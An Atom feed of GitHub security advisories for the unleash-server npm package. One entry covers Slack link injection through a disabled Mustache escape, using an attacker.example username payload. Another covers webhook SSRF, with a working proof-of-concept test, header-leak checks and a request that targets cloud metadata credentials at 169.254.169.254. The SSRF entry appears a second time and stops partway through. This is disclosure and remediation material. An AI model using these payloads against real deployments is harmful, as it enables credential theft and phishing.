<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-21T19:18:01.967Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Global Mustache.escape override disables HTML escaping process-wide, enabling Slack/Teams link-injection via unrestricted username]]></title>
        <id>https://github.com/advisories/GHSA-w4mq-xh27-6xpx</id>
        <link href="https://github.com/advisories/GHSA-w4mq-xh27-6xpx"/>
        <updated>2026-08-21T19:14:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>src/lib/addons/feature-event-formatter-md.ts</code>
<strong>Line</strong>: 355 (in v8.0.1; <code>format()</code> method)</p>
<h3 id="root-cause">Root Cause</h3>
<p><code>FeatureEventFormatterMd.format()</code> does:</p>
<pre><code class="language-ts">Mustache.escape = (text) =&gt; text;
const text = Mustache.render(action, context);
</code></pre>
<p><code>mustache</code> (pinned <code>^4.2.0</code>, confirmed installed <code>4.2.0</code>) keeps <code>escape</code> as a <strong>module-level singleton</strong> (<code>mustache.js</code>: <code>mustache.escape = escapeHtml;</code>), read by every <code>Mustache.render()</code> call in the process unless a per-call <code>config.escape</code> override is passed (<code>var escape = this.getConfigEscape(config) || mustache.escape;</code>). Node's module cache guarantees every <code>import Mustache from 'mustache'</code> in the process — <code>feature-event-formatter-md.ts</code>, <code>email-service.ts</code>, <code>webhook.ts</code>, <code>datadog.ts</code>, <code>new-relic.ts</code> — shares the same object instance.</p>
<p>This assignment therefore <strong>permanently disables HTML escaping for every other <code>Mustache.render()</code> call in the same Node process</strong> (including <code>email-service.ts</code> templates) from the moment any single notification addon (Webhook, Slack legacy, Microsoft Teams, Datadog, New Relic) first formats any event, for the remaining lifetime of the process.</p>
<p><code>feature-event-formatter-md-events.ts</code> (<code>EVENT_MAP</code>) confirms the blast radius: nearly every event's <code>action</code> template interpolates attacker-controlled values with single-mustache (intended-to-be-escaped) syntax, most importantly <code>{{user}}</code>, which is <code>event.createdBy</code> — the acting account's <code>username</code> (or <code>email</code> if set; <code>src/lib/util/extract-user.ts</code>: <code>extractUsernameFromUser</code>). Neither <code>username</code> nor <code>name</code> have any charset/length validation anywhere in the codebase (<code>create-user-schema.ts</code>, <code>create-invited-user-schema.ts</code>, <code>user-service.ts:289</code> only does <code>Joi.assert(name, Joi.string(), 'Name')</code> — a type check, nothing more).</p>
<p>Slack's own API docs require <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> to be replaced with <code>&amp;amp;</code>, <code>&amp;lt;</code>, <code>&amp;gt;</code> before sending user-generated text, specifically so Slack's mrkdwn parser does not interpret it as <code>&lt;url|label&gt;</code> link syntax. Mustache's default <code>escapeHtml</code> happens to produce exactly those entities, so this was (likely unintentionally) the application's only defense against link-injection in chat notifications — and it is unconditionally switched off by the same code path that depends on it.</p>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Admin has a Webhook, Slack (legacy), Microsoft Teams, Datadog, or New Relic integration configured (a very common production setup for flag-change notifications).</li>
<li>Attacker has (or self-registers, if public signup is enabled — <code>POST /invite/:token/signup</code> is <code>permission: NONE</code>) any <strong>Editor</strong>-level account and sets <code>username</code> to e.g. <code>evil&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;</code>.</li>
<li>Attacker performs any ordinary write action (create/update/toggle a feature flag — routine, no special privilege beyond Editor on one project).</li>
<li>The configured addon's <code>handleEvent()</code> calls <code>this.msgFormatter.format(event)</code>, which mutates the global escape function and immediately renders the <code>{{user}}</code>-containing template with escaping disabled.</li>
<li>The resulting message — containing the attacker's raw <code>&lt;url|label&gt;</code> Slack link syntax — is POSTed to the team's Slack/Teams channel or webhook endpoint and rendered as a real, clickable, attacker-labeled hyperlink inside a trusted automated notification feed.</li>
</ol>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<pre><code class="language-ts">Mustache.escape = (text) =&gt; text;

const text = Mustache.render(action, context);
const url = path
    ? `${this.unleashUrl}${Mustache.render(path, context)}`
    : undefined;
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored markdown/link-injection (phishing-link injection) into any configured outbound notification channel (Slack legacy, MS Teams, Webhook default markdown, Datadog, New Relic), using an attacker-controlled username — no admin privilege required, only Editor on a single project, and potentially reachable through public self-signup.</li>
<li>Secondary: loss of HTML escaping for any other reachable Mustache single-mustache placeholder process-wide until restart (increases severity of any other currently-unreached or future Mustache sink, e.g. email templates).</li>
<li>Tertiary: a custom Webhook <code>bodyTemplate</code> that interpolates raw event/user fields directly into a JSON string literal (rather than the pre-escaped <code>eventJson</code> field the code already provides for this purpose) can have its JSON structure broken by an attacker-controlled <code>"</code> character once the global escape function is neutered.</li>
</ul>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Never mutate the shared <code>Mustache.escape</code> global. Pass a local escape function via Mustache's per-call render option instead (supported and typed in <code>@types/mustache@4.2.6</code>'s <code>RenderOptions.escape</code>):</p>
<pre><code class="language-ts">const renderConfig = { escape: (text: string) =&gt; text };
const text = Mustache.render(action, context, undefined, renderConfig);
const url = path
    ? `${this.unleashUrl}${Mustache.render(path, context, undefined, renderConfig)}`
    : undefined;
</code></pre>
<h3 id="verification">Verification</h3>
<p>Dynamically confirmed on v8.0.1 in a local Docker lab (official <code>unleashorg/unleash-server:8.0.1</code> image + Postgres 15):</p>
<ul>
<li>Created a Webhook addon with the addon UI's own placeholder <code>bodyTemplate</code> (<code>{{event.createdBy}}</code> etc.), pointed at a local listener.</li>
<li>Created an Editor-role user with <code>username = evil2&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;</code> (accepted with HTTP 201, no sanitization).</li>
<li>Logged in as that user and created a feature flag (ordinary Editor action).</li>
<li>Captured webhook payload: <code>"createdBy": "evil2&lt;https://attacker.example/urgent-rollback|Click here to view incident&gt;"</code> — <code>&lt;</code>, <code>&gt;</code>, <code>|</code> completely unescaped, live Slack link-injection syntax.</li>
<li>Control test with the same pinned <code>mustache@4.2.0</code> package confirmed the default (pre-bug) output for the same string would have been <code>evil2&amp;lt;https:&amp;#x2F;&amp;#x2F;attacker.example&amp;#x2F;urgent-rollback|Click here to view incident&amp;gt;</code> — i.e. the single global assignment is solely responsible for the unescaped output observed live.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-w4mq-xh27-6xpx">https://github.com/Unleash/unleash/security/advisories/GHSA-w4mq-xh27-6xpx</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/002012cfdbedd2e9b7db9dc83b9f549f761db22e">https://github.com/Unleash/unleash/commit/002012cfdbedd2e9b7db9dc83b9f549f761db22e</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.3">https://github.com/Unleash/unleash/releases/tag/v8.0.3</a></li>
<li><a href="https://github.com/advisories/GHSA-w4mq-xh27-6xpx">https://github.com/advisories/GHSA-w4mq-xh27-6xpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w4mq-xh27-6xpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers]]></title>
        <id>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</id>
        <link href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj"/>
        <updated>2026-08-21T19:14:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target <code>url</code> parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's <code>parameters.url</code> and passed straight to the HTTP client (<code>ky</code>) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example <code>http://169.254.169.254/latest/meta-data/…</code> (cloud IMDS), <code>http://127.0.0.1:&lt;port&gt;/…</code> (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.</p>
<p>The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured <code>Authorization</code> header and arbitrary <code>customHeaders</code> to whatever host the <code>url</code> points at (Datadog forwards <code>DD-API-KEY</code>), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.</p>
<p>Creating/updating addons is gated by the root permissions <code>CREATE_ADDON</code> / <code>UPDATE_ADDON</code>. These are not the super-admin <code>ADMIN</code> permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.</p>
<h2 id="affected-code-v800">Affected code (v8.0.0)</h2>
<p>The base addon issues the outbound request with the raw URL and no host checks (<code>src/lib/addons/addon.ts</code>):</p>
<pre><code class="language-ts">async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise&lt;Response&gt; {
    try {
        const res = await ky(url, {            // &lt;-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
</code></pre>
<p>The webhook provider passes the operator-supplied <code>parameters.url</code> (and forwards <code>authorization</code> + <code>customHeaders</code>) directly into that sink (<code>src/lib/addons/webhook.ts</code>):</p>
<pre><code class="language-ts">const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // &lt;-- configured secret forwarded to `url`
        ...extraHeaders,                              // &lt;-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // &lt;-- server dials attacker-chosen host
</code></pre>
<p>The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (<code>src/lib/services/addon-service.ts</code> → <code>validateKnownProvider</code>, <code>validateRequiredParameters</code>). The addon parameter schema (<code>src/lib/services/addon-schema.ts</code>) treats <code>url</code> as a free-form string; the <code>type: 'url'</code> field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of <code>src/lib/addons</code> and <code>addon-service.ts</code> for <code>169.254</code>, <code>127.0</code>, <code>localhost</code>, <code>private</code>, <code>ssrf</code>, <code>isAllowed</code>, <code>validateUrl</code> returns zero guards. The same unguarded <code>fetchRetry(url, …)</code> sink backs the Slack, Teams, Datadog, and New Relic providers.</p>
<p>The route gate (<code>src/lib/routes/admin-api/addon.ts</code>) requires the root permission <code>CREATE_ADDON</code> (create) / <code>UPDATE_ADDON</code> (update); <code>src/lib/types/permissions.ts</code> lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from <code>ADMIN</code>.</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is an authenticated Unleash user (or an admin API token) holding the root permission <code>CREATE_ADDON</code> or <code>UPDATE_ADDON</code>. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with <code>parameters.url</code> set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.</p>
<h2 id="impact">Impact</h2>
<p>The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (<code>169.254.169.254</code>) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured <code>Authorization</code> header and any <code>customHeaders</code> (and, for the Datadog provider, the <code>DD-API-KEY</code>) to the attacker-chosen host, since those headers are sent to whatever <code>url</code> is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
<p>This PoC drives the <strong>real</strong> <code>WebhookAddon.handleEvent</code> from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured <code>Authorization</code> and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.</p>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
</code></pre>
<h3 id="file-1--vitestpocconfigts-project-root">File 1 — <code>vitest.poc.config.ts</code> (project root)</h3>
<p>The repo's default vitest config has a Postgres <code>globalSetup</code>; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.</p>
<pre><code class="language-ts">import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
</code></pre>
<h3 id="file-2--srclibaddonsssrf-poctestts">File 2 — <code>src/lib/addons/ssrf-poc.test.ts</code></h3>
<pre><code class="language-ts">// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () =&gt; {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) =&gt; false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise&lt;{
    url: string;
    hits: Array&lt;{ path: string; auth?: string; secret?: string; body: string }&gt;;
    close: () =&gt; Promise&lt;void&gt;;
}&gt; {
    const hits: Array&lt;{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }&gt; = [];
    return new Promise((resolve) =&gt; {
        const server = http.createServer((req, res) =&gt; {
            let body = '';
            req.on('data', (c) =&gt; (body += c));
            req.on('end', () =&gt; {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () =&gt; {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =&gt;
                    new Promise((r) =&gt; server.close(() =&gt; r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () =&gt; {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () =&gt; {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -&gt; internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () =&gt; {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -&gt; proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
</code></pre>
<h3 id="observed-output-real-run-against-v800">Observed output (real run against v8.0.0)</h3>
<pre><code> RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -&gt; internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
</code></pre>
<p>The internal loopback listener received the request (<code>path</code> = the metadata path), with the configured <code>Authorization: Bearer operator-webhook-secret</code> and <code>X-Internal-Secret: leaked-to-internal-host</code> headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: <code>POST /api/admin/addons</code> with <code>{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }</code> (requires <code>CREATE_ADDON</code>), then create any feature flag to trigger the outbound request.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate the addon <code>url</code> server-side before it is ever dialed, both at create/update time (<code>addon-service.ts</code>) and again at request time (<code>addon.ts</code> <code>fetchRetry</code>). Specifically: require <code>http</code>/<code>https</code> only; resolve the hostname and reject the request if any resolved address is loopback (<code>127.0.0.0/8</code>, <code>::1</code>), link-local (<code>169.254.0.0/16</code>, <code>fe80::/10</code>, including the <code>169.254.169.254</code>/<code>fd00:ec2::254</code> metadata addresses), private (<code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>fc00::/7</code>), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a <code>30x</code> cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on <code>Addon.fetchRetry</code> (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured <code>Authorization</code>/<code>customHeaders</code> to non-allow-listed hosts to contain credential leakage.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1">https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/advisories/GHSA-5vf6-jrqr-78fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers]]></title>
        <id>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</id>
        <link href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj"/>
        <updated>2026-08-21T19:14:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target <code>url</code> parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's <code>parameters.url</code> and passed straight to the HTTP client (<code>ky</code>) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example <code>http://169.254.169.254/latest/meta-data/…</code> (cloud IMDS), <code>http://127.0.0.1:&lt;port&gt;/…</code> (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.</p>
<p>The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured <code>Authorization</code> header and arbitrary <code>customHeaders</code> to whatever host the <code>url</code> points at (Datadog forwards <code>DD-API-KEY</code>), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.</p>
<p>Creating/updating addons is gated by the root permissions <code>CREATE_ADDON</code> / <code>UPDATE_ADDON</code>. These are not the super-admin <code>ADMIN</code> permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.</p>
<h2 id="affected-code-v800">Affected code (v8.0.0)</h2>
<p>The base addon issues the outbound request with the raw URL and no host checks (<code>src/lib/addons/addon.ts</code>):</p>
<pre><code class="language-ts">async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise&lt;Response&gt; {
    try {
        const res = await ky(url, {            // &lt;-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
</code></pre>
<p>The webhook provider passes the operator-supplied <code>parameters.url</code> (and forwards <code>authorization</code> + <code>customHeaders</code>) directly into that sink (<code>src/lib/addons/webhook.ts</code>):</p>
<pre><code class="language-ts">const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // &lt;-- configured secret forwarded to `url`
        ...extraHeaders,                              // &lt;-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // &lt;-- server dials attacker-chosen host
</code></pre>
<p>The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (<code>src/lib/services/addon-service.ts</code> → <code>validateKnownProvider</code>, <code>validateRequiredParameters</code>). The addon parameter schema (<code>src/lib/services/addon-schema.ts</code>) treats <code>url</code> as a free-form string; the <code>type: 'url'</code> field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of <code>src/lib/addons</code> and <code>addon-service.ts</code> for <code>169.254</code>, <code>127.0</code>, <code>localhost</code>, <code>private</code>, <code>ssrf</code>, <code>isAllowed</code>, <code>validateUrl</code> returns zero guards. The same unguarded <code>fetchRetry(url, …)</code> sink backs the Slack, Teams, Datadog, and New Relic providers.</p>
<p>The route gate (<code>src/lib/routes/admin-api/addon.ts</code>) requires the root permission <code>CREATE_ADDON</code> (create) / <code>UPDATE_ADDON</code> (update); <code>src/lib/types/permissions.ts</code> lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from <code>ADMIN</code>.</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is an authenticated Unleash user (or an admin API token) holding the root permission <code>CREATE_ADDON</code> or <code>UPDATE_ADDON</code>. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with <code>parameters.url</code> set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.</p>
<h2 id="impact">Impact</h2>
